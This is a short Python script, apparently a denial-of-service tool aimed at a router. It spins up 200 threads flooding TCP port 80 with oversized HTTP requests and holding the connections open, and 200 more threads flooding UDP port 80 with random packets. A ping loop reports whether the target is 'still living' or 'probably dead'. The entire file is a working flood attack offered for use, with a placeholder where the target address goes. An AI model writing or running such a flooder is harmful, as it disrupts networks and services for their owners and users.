import socket
import threading
import random
import time
import subprocess

target_ip = "IP Adresse"
tcp_port = 80
udp_port = 80
threads = 200  

open_sockets = []

def tcp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, tcp_port))
            payload = b"GET /" + b"A" * 10000 + b" HTTP/1.1\r\nHost: router\r\n\r\n"
            s.sendall(payload)
            open_sockets.append(s) 
        except:
            pass

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            packet = random._urandom(1024)
            sock.sendto(packet, (target_ip, udp_port))
        except:
            pass

def ping_monitor():
    while True:
        try:
            output = subprocess.check_output(["ping", "-n", "1", target_ip], stderr=subprocess.DEVNULL)
            lines = output.decode(errors="ignore").split("\n")
            for line in lines:
                if "Time=" in line:
                    print("📡 Router is still living →", line.strip())
        except:
            print("❌ No respond - probably dead")
        time.sleep(1)

for _ in range(threads):
    threading.Thread(target=tcp_flood, daemon=True).start()

for _ in range(threads):
    threading.Thread(target=udp_flood, daemon=True).start()

threading.Thread(target=ping_monitor, daemon=True).start()

while True:
    time.sleep(10)
